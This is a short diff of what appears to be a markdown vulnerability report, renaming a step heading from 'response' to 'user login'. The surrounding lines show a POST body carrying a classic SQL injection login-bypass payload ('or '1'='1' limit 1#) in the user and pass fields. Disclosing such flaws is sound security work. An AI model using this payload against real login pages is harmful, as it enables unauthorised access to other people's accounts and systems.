@@ -46,7 +46,7 @@ Cache-Control: no-cache
 user='or '1'='1' limit 1#&pass='or '1'='1' limit 1#&submit=%E6%8F%90%E4%BA%A4
 ```
 
-4. response
+4. user login
 
 ![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/7b977528-8ee2-492e-850a-3f88b26917cf)
 ![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/72730c85-66cc-49a3-a963-6669a24eb9c8)
